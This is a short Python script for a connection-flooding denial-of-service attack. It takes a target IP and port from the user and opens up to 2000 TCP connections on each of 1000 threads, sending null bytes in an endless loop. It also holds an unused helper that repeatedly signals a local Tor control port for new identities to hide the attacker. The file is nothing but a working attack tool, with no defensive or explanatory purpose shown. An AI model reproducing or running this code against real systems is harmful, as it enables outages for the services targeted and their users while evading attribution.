import socket
import threading
import time

def make_socket(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, port))
        print(f"[Connected -> {host}:{port}]")
        return sock
    except Exception as e:
        print(f"Connection failed: {e}")
        sock.close()  # Close the socket if connection fails
        return None


def attack(host, port, id):
    sockets = [0] * CONNECTIONS
    while True:
        for x in range(CONNECTIONS):
            if sockets[x] == 0:
                sockets[x] = make_socket(host, port)
            try:
                if sockets[x]:
                    sockets[x].send(b"\0")
                    print(f"[{id}: Voly Sent]")
            except Exception as e:
                print(f"Socket error: {e}")
                sockets[x] = make_socket(host, port)
        time.sleep(0.3)


def cycle_identity():
    try:
        sock = make_socket("localhost", 9050)
        if sock:
            sock.send(b'AUTHENTICATE ""\n')
            while True:
                sock.send(b'signal NEWNYM\n\x00')
                print("[cycle_identity -> signal NEWNYM]")
                time.sleep(0.3)
    except Exception as e:
        print(f"Identity cycling failed: {e}")


if __name__ == "__main__":
    CONNECTIONS = 2000
    THREADS = 1000
    host = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    
    for x in range(THREADS):
        threading.Thread(target=attack, args=(host, port, x)).start()
        time.sleep(0.2)
    
    input()  # Keeps the program running
